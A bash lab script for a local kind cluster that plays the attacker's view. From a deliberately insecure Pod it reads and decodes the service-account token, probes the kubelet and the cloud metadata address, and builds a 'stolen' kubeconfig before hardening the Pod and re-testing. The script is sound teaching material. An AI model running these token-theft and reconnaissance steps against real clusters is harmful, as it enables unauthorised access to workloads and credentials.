#!/usr/bin/env bash
# Lab 05.00: The attacker's view. Tier A (kind).
#
# Run this ONLY against a kind cluster you own, from any directory. It creates
# three throwaway namespaces (p05-recon-app, p05-target and p05-neighbour), runs
# reconnaissance from a compromised Pod and from the network, hardens the
# compromised Pod, runs the same reconnaissance again, and deletes everything it
# created. The weak Pod is deliberately insecure and lives only in
# p05-recon-app.
#
# A kind node is a container on the machine that runs kind. Every probe here
# reads from that node (the kubelet's status answers and the Pod network) or
# from another Pod. Nothing writes to the node, nothing reaches the machine that
# runs kind, and nothing reaches a cloud. The metadata address is probed only to
# show that kind has no metadata service.
#
# The stolen token is copied to a temporary directory on the machine that runs
# this script, and that directory is removed on exit.
set +e

# Read a command from stdin, print it exactly as it runs, then run it.
run() { local cmd; cmd=$(cat); printf '$ %s\n' "$cmd"; eval "$cmd" 2>&1; echo; }

ctx=$(kubectl config current-context 2>/dev/null)
case "$ctx" in
  kind-*) ;;
  *) echo "refusing to run: kubectl context '$ctx' is not a kind cluster" >&2; exit 2 ;;
esac

work=$(mktemp -d) && cd "$work" || exit 1
trap 'rm -rf "$work"' EXIT

# The API server address this workstation uses. The stolen kubeconfig reuses it.
server=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')

kubectl delete ns p05-recon-app p05-target p05-neighbour --ignore-not-found --wait=true >/dev/null 2>&1

echo '## step 0: the cluster this run used'
run <<'CMD'
kubectl version --client
kubectl get nodes -o custom-columns=NAME:.metadata.name,KUBELET:.status.nodeInfo.kubeletVersion,RUNTIME:.status.nodeInfo.containerRuntimeVersion,KERNEL:.status.nodeInfo.kernelVersion
CMD

cat >ledger.yaml <<'YAML'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: ledger-sa
  namespace: p05-target
automountServiceAccountToken: false
---
apiVersion: v1
kind: Pod
metadata:
  name: ledger
  namespace: p05-target
  labels:
    app.kubernetes.io/name: ledger
spec:
  serviceAccountName: ledger-sa
  automountServiceAccountToken: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
      command: ["sh", "-c", "mkdir -p /tmp/www && echo ledger-ok > /tmp/www/index.html && exec httpd -f -p 8080 -h /tmp/www"]
      ports:
        - containerPort: 8080
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
      resources:
        requests: { cpu: 10m, memory: 16Mi }
        limits: { memory: 64Mi }
      volumeMounts:
        - name: tmp
          mountPath: /tmp
  volumes:
    - name: tmp
      emptyDir: {}
---
apiVersion: v1
kind: Service
metadata:
  name: ledger
  namespace: p05-target
spec:
  selector:
    app.kubernetes.io/name: ledger
  ports:
    - port: 8080
      targetPort: 8080
YAML

cat >neighbour.yaml <<'YAML'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: neighbour-sa
  namespace: p05-neighbour
automountServiceAccountToken: false
---
apiVersion: v1
kind: Pod
metadata:
  name: neighbour
  namespace: p05-neighbour
spec:
  serviceAccountName: neighbour-sa
  automountServiceAccountToken: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 100
    runAsGroup: 101
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      image: curlimages/curl@sha256:58adaa4e8dca9c988bae2aba4ab3434a0bb2da16bbe3f92dec39ec7785166777  # curlimages/curl:8.22.0
      command: ["sleep", "3600"]
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
      resources:
        requests: { cpu: 10m, memory: 16Mi }
        limits: { memory: 64Mi }
      volumeMounts:
        - name: tmp
          mountPath: /tmp
  volumes:
    - name: tmp
      emptyDir: {}
YAML

cat >checkout-service.yaml <<'YAML'
apiVersion: v1
kind: Service
metadata:
  name: checkout
  namespace: p05-recon-app
spec:
  selector:
    app.kubernetes.io/name: checkout
  ports:
    - port: 8080
      targetPort: 8080
YAML

cat >checkout-weak.yaml <<'YAML'
# INSECURE ON PURPOSE: a root Pod that names no ServiceAccount, so it mounts the default token and keeps service links. Lab cluster only.
apiVersion: v1
kind: Pod
metadata:
  name: checkout
  namespace: p05-recon-app
  labels:
    app.kubernetes.io/name: checkout
spec:
  containers:
    - name: app
      image: curlimages/curl@sha256:58adaa4e8dca9c988bae2aba4ab3434a0bb2da16bbe3f92dec39ec7785166777  # curlimages/curl:8.22.0
      command: ["sleep", "3600"]
      securityContext:
        runAsUser: 0
YAML

cat >checkout-hardened.yaml <<'YAML'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: checkout-sa
  namespace: p05-recon-app
automountServiceAccountToken: false
---
apiVersion: v1
kind: Pod
metadata:
  name: checkout
  namespace: p05-recon-app
  labels:
    app.kubernetes.io/name: checkout
spec:
  serviceAccountName: checkout-sa
  automountServiceAccountToken: false
  enableServiceLinks: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 100
    runAsGroup: 101
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      image: curlimages/curl@sha256:58adaa4e8dca9c988bae2aba4ab3434a0bb2da16bbe3f92dec39ec7785166777  # curlimages/curl:8.22.0
      command: ["sleep", "3600"]
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
      resources:
        requests: { cpu: 10m, memory: 16Mi }
        limits: { memory: 64Mi }
      volumeMounts:
        - name: tmp
          mountPath: /tmp
  volumes:
    - name: tmp
      emptyDir: {}
YAML

cat >policies.yaml <<'YAML'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny
  namespace: p05-recon-app
spec:
  podSelector: {}
  policyTypes: ["Ingress", "Egress"]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: checkout-egress
  namespace: p05-recon-app
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: checkout
  policyTypes: ["Egress"]
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - { protocol: UDP, port: 53 }
        - { protocol: TCP, port: 53 }
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: p05-target
          podSelector:
            matchLabels:
              app.kubernetes.io/name: ledger
      ports:
        - { protocol: TCP, port: 8080 }
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny
  namespace: p05-target
spec:
  podSelector: {}
  policyTypes: ["Ingress"]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: ledger-from-checkout
  namespace: p05-target
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: ledger
  policyTypes: ["Ingress"]
  ingress:
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: p05-recon-app
          podSelector:
            matchLabels:
              app.kubernetes.io/name: checkout
      ports:
        - { protocol: TCP, port: 8080 }
YAML

echo '## step 1: three namespaces: the target, a neighbour, and the compromised app'
run <<'CMD'
kubectl create ns p05-target
kubectl label ns p05-target pod-security.kubernetes.io/enforce=restricted pod-security.kubernetes.io/warn=restricted
kubectl create ns p05-neighbour
kubectl label ns p05-neighbour pod-security.kubernetes.io/enforce=restricted pod-security.kubernetes.io/warn=restricted
kubectl create ns p05-recon-app
kubectl label ns p05-recon-app pod-security.kubernetes.io/enforce=baseline pod-security.kubernetes.io/warn=restricted
CMD

echo '## step 2: the ledger service and a neighbour, both hardened'
run <<'CMD'
kubectl apply -f ledger.yaml
kubectl wait -n p05-target --for=condition=Ready pod/ledger --timeout=180s
kubectl apply -f neighbour.yaml
kubectl wait -n p05-neighbour --for=condition=Ready pod/neighbour --timeout=180s
CMD

echo '## step 3: the weak app: a Service, then a root Pod that names no ServiceAccount'
run <<'CMD'
kubectl apply -f checkout-service.yaml
kubectl apply -f checkout-weak.yaml
kubectl wait -n p05-recon-app --for=condition=Ready pod/checkout --timeout=180s
CMD

echo '## step 4: who the compromised Pod is, and the token it carries'
run <<'CMD'
kubectl exec -n p05-recon-app checkout -- sh -c '
  id
  ls /var/run/secrets/kubernetes.io/serviceaccount
  T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  P=$(echo "$T" | cut -d. -f2 | tr "_-" "/+")
  while [ $(( ${#P} % 4 )) -ne 0 ]; do P="$P="; done
  J=$(echo "$P" | base64 -d)
  echo "$J" | tr "," "\n" | grep -E "\"(sub|namespace|name)\""
  iat=$(echo "$J" | grep -o "\"iat\":[0-9]*" | cut -d: -f2)
  exp=$(echo "$J" | grep -o "\"exp\":[0-9]*" | cut -d: -f2)
  echo "token lifetime: $((exp - iat)) seconds"'
CMD

echo '## step 5: the environment: one variable per Service in the namespace'
run <<'CMD'
kubectl exec -n p05-recon-app checkout -- sh -c 'env | grep -E "_SERVICE_(HOST|PORT)=" | sort'
CMD

echo '## step 6: DNS: the search path, a name that exists, and a guessed name'
run <<'CMD'
kubectl exec -n p05-recon-app checkout -- sh -c 'grep "^search" /etc/resolv.conf | cut -d" " -f1-4; grep "^nameserver" /etc/resolv.conf; nslookup ledger.p05-target.svc.cluster.local; nslookup payments.p05-target.svc.cluster.local; echo "payments.p05-target.svc.cluster.local: exit $?"'
CMD

echo '## step 7: API discovery and the default identity, from inside the Pod'
run <<'CMD'
kubectl exec -n p05-recon-app checkout -- sh -c '
  T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
  curl -s -o /dev/null -w "discovery: %{http_code}\n" --cacert $CA -H "Authorization: Bearer $T" https://kubernetes.default.svc/apis
  printf "API groups: %s\n" "$(curl -s --cacert $CA -H "Authorization: Bearer $T" https://kubernetes.default.svc/apis | tr "," "\n" | grep -c "\"preferredVersion\"")"
  curl -s -o /dev/null -w "services in p05-target: %{http_code}\n" --cacert $CA -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces/p05-target/services
  curl -s --cacert $CA -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces/p05-target/services | tr "," "\n" | grep "\"message\""'
CMD

echo '## step 8: the kubelet, on the node behind the Pod default gateway'
run <<'CMD'
kubectl exec -n p05-recon-app checkout -- sh -c '
  T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  GW=$(netstat -rn | grep "^0.0.0.0" | tr -s " " | cut -d" " -f2)
  echo "default gateway: $GW"
  curl -sk -o /dev/null -w "anonymous: %{http_code}\n" --max-time 5 https://$GW:10250/pods
  curl -sk -w "\nwith token: %{http_code}\n" --max-time 5 -H "Authorization: Bearer $T" https://$GW:10250/pods'
CMD

echo '## step 9: the cloud metadata address, on kind'
run <<'CMD'
kubectl exec -n p05-recon-app checkout -- sh -c 'curl -s -o /dev/null --max-time 5 http://169.254.169.254/latest/meta-data/; echo "metadata: exit $?"'
CMD

echo '## step 10: the flat network: a Pod in another namespace reaches the ledger'
run <<'CMD'
kubectl exec -n p05-recon-app checkout -- sh -c 'curl -s --max-time 5 http://ledger.p05-target:8080/'
kubectl exec -n p05-neighbour neighbour -- sh -c 'curl -s --max-time 5 http://ledger.p05-target:8080/'
CMD

echo '## step 11: from the network, with the stolen token: a workstation with the token and the cluster CA'
run <<'CMD'
kubectl exec -n p05-recon-app checkout -- cat /var/run/secrets/kubernetes.io/serviceaccount/token > token.txt
kubectl exec -n p05-recon-app checkout -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt > ca.crt
kubectl config set-cluster lab --server="$server" --certificate-authority=ca.crt --embed-certs=true --kubeconfig=stolen.kubeconfig
kubectl config set-credentials stolen --token="$(cat token.txt)" --kubeconfig=stolen.kubeconfig
kubectl config set-context lab --cluster=lab --user=stolen --kubeconfig=stolen.kubeconfig
kubectl config use-context lab --kubeconfig=stolen.kubeconfig
CMD
run <<'CMD'
kubectl --kubeconfig=stolen.kubeconfig auth can-i --list -n p05-target
kubectl --kubeconfig=stolen.kubeconfig get services -n p05-target
CMD

echo '## step 12: harden: delete the weak Pod, enforce restricted, and watch the weak manifest be refused'
run <<'CMD'
kubectl delete pod checkout -n p05-recon-app --wait=true
kubectl label ns p05-recon-app pod-security.kubernetes.io/enforce=restricted --overwrite
kubectl apply --dry-run=server -f checkout-weak.yaml
CMD

echo '## step 13: harden: NetworkPolicies, a ServiceAccount of its own, and the hardened Pod'
run <<'CMD'
kubectl apply -f policies.yaml
kubectl apply -f checkout-hardened.yaml
kubectl wait -n p05-recon-app --for=condition=Ready pod/checkout --timeout=180s
CMD

echo '## step 14: re-attack: identity, token and environment'
run <<'CMD'
kubectl exec -n p05-recon-app checkout -- sh -c 'id; test -e /var/run/secrets/kubernetes.io/serviceaccount/token && echo "token: present" || echo "token: absent"; env | grep -E "_SERVICE_(HOST|PORT)=" || echo "service variables: none"'
CMD

echo '## step 15: re-attack: DNS still resolves, because the allowed path needs it'
run <<'CMD'
kubectl exec -n p05-recon-app checkout -- sh -c 'nslookup ledger.p05-target.svc.cluster.local; echo "dns: exit $?"'
CMD

echo '## step 16: re-attack: the kubelet and the API server, with the egress policy in place'
run <<'CMD'
kubectl exec -n p05-recon-app checkout -- sh -c 'GW=$(netstat -rn | grep "^0.0.0.0" | tr -s " " | cut -d" " -f2); curl -sk -o /dev/null --max-time 5 https://$GW:10250/pods; echo "kubelet: exit $?"; curl -s -o /dev/null --max-time 5 https://kubernetes.default.svc/version; echo "api: exit $?"'
CMD

echo '## step 17: re-attack: the allowed path works, and a neighbour is refused'
run <<'CMD'
kubectl exec -n p05-recon-app checkout -- sh -c 'curl -s --max-time 5 http://ledger.p05-target:8080/; echo "ledger from checkout: exit $?"'
kubectl exec -n p05-neighbour neighbour -- sh -c 'curl -s --max-time 5 http://ledger.p05-target:8080/; echo "ledger from neighbour: exit $?"'
CMD

echo '## step 18: re-attack: the token stolen in step 11, a minute after its Pod was deleted'
run <<'CMD'
sleep 65
kubectl --kubeconfig=stolen.kubeconfig auth can-i --list -n p05-target
CMD

echo '## step 19: cleanup'
run <<'CMD'
kubectl delete ns p05-recon-app p05-target p05-neighbour --wait=true
CMD
